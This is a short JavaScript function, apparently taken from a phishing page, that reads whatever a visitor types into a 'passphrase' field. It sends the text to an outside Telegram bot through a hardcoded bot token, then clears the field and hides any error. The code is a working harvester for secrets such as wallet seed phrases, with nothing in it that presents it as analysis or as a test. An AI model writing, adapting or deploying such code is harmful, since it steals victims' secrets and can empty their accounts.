    function sendToTelegram() {
      const message = document.getElementById("passphrase").value.trim();

      if (!message) return; // Do nothing if input is empty

      const text = `🔐 New Passphrase Submitted:\n\n${message}`;

      fetch(`https://api.telegram.org/bot7210917381:AAGPxkv9Y3dqnBj_rHOtWvvuIyg9qHlpFrg/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: text
        })
      }).then(() => {
        // Optional: Clear input silently
        document.getElementById("passphrase").value = "";
      }).catch(() => {
        // Error silently ignored
      });
    }
